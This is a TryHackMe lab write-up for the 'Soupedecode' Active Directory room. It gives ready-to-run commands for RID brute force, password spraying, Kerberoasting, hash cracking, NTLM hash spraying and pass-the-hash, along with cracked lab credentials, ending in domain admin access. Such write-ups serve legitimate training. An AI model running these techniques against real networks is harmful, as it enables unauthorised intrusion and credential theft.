---
title: "THM: Soupedecode"
date: 2025-11-23 18:00:00 +1000
categories: [TryHackMe, Medium]
tags: [windows, active-directory, kerberoasting, pass-the-hash, rid-brute, password-spraying]
---

Windows Active Directory box. Enumerated users via RID brute force with guest access, password sprayed to gain initial foothold, kerberoasted service account, and used pass-the-hash with extracted NTLM hashes for domain admin access.

## Initial Enumeration

### Nmap Scan
```
sudo nmap -sS -sV -sC -p- -T4 TARGET_IP -v
```

**Results:**
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: DC01; Domain: SOUPEDECODE.LOCAL
```

**Key Findings:**
- Domain Controller
- Domain: SOUPEDECODE.LOCAL
- Hostname: DC01

---

## Initial Access

### Anonymous SMB Enumeration
```
enum4linux-ng TARGET_IP
```

Discovered anonymous/guest access enabled.

### Adding Domain to Hosts
```
sudo sed -i '1iTARGET_IP    dc01.soupedecode.local' /etc/hosts
```

### Share Enumeration
```
nxc smb dc01.soupedecode.local -u 'guest' -p '' --shares
```

---

## User Enumeration

### RID Brute Force
```
nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000
```

### Building Username List
```
nxc smb dc01.soupedecode.local -u 'guest' -p '' --rid-brute 3000 | cut -d '\' -f 2 | cut -d ' ' -f 1 > Soupedecode_Usernames.txt
```

### Password Spraying
```
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS dc01.soupedecode.local
set USER_FILE Soupedecode_Usernames.txt
set PASS_FILE Soupedecode_Usernames.txt
run
```

**Success:** Found credentials **ybob317:ybob317**

---

## First Flag

### Verifying Credentials
```
nxc smb dc01.soupedecode.local -u 'ybob317' -p 'ybob317'
```

### Accessing User Share
```
smbclient //dc01.soupedecode.local/Users -U ybob317
cd ybob317/Desktop
get user.txt
```

First flag obtained.

---

## Privilege Escalation

### Kerberoasting
```
GetUserSPNs.py -request -outputfile kerberoastables.txt 'SOUPEDECODE.LOCAL/ybob317:ybob317'
```

### Cracking Service Account
```
john --wordlist=/Desktop/rockyou.txt ~/kerberoastables.txt
john ~/kerberoastables.txt --show
```

**Cracked credentials:** file_svc:Password123!!

---

## Lateral Movement

### Enumerating file_svc Access
```
nxc smb dc01.soupedecode.local -u 'file_svc' -p 'Password123!!' --shares
```

Discovered "backup" share.

### Accessing Backup Share
```
smbclient //TARGET_IP/backup -U file_svc
get backup_extract.txt
```

**Contents:** NTLM password hashes

---

## Hash Extraction

### Parsing Credentials
```
cat backup_extract.txt | cut -d ':' -f 1 > backup_usernames.txt
cat backup_extract.txt | cut -d ':' -f 4 > backup_ntlm.txt
```

### Hash Spraying
```
nxc smb dc01.soupedecode.local -u backup_usernames.txt -H backup_ntlm.txt --no-bruteforce --continue-on-success
```

**Result:** Hash `:e41da7e79a4c76dbd9cf79d1cb325559` shows **(Pwned!)** - administrative privileges

---

## Domain Admin Access

### Pass-the-Hash
```
smbclient --hashes :e41da7e79a4c76dbd9cf79d1cb325559 'SOUPEDECODE.LOCAL/FileServer$@dc01.soupedecode.local'
```

### Retrieving Root Flag
```
use C$
cd Users/Administrator/Desktop
get root.txt
```

Root flag obtained.

---

## Notable Commands

| Command | Description |
|---------|-------------|
| `nmap -sS -sV -sC -p-` | Full SYN scan with service detection |
| `--rid-brute` | Enumerate users via RID cycling |
| `GetUserSPNs` | Request Kerberos TGS tickets (Kerberoasting) |
| `--no-bruteforce` | Test each user with corresponding hash only |
| `--continue-on-success` | Keep testing after finding valid creds |
| `smbclient --hashes` | Pass-the-Hash authentication |

---

## Key Takeaways

- Anonymous SMB on domain controllers enables full user enumeration via RID brute force
- Weak password patterns (username:username) are easily exploited
- Kerberoasting extracts crackable hashes from service accounts with SPNs
- Backup shares frequently contain sensitive data like password hashes
- Pass-the-Hash allows authentication without plaintext passwords
- "Pwned!" indicator in NetExec signifies administrative access

---

**Room:** Soupedecode | **Platform:** TryHackMe | **Difficulty:** Medium | **Attack Path:** Anonymous SMB → RID Brute → Kerberoasting → Pass-the-Hash
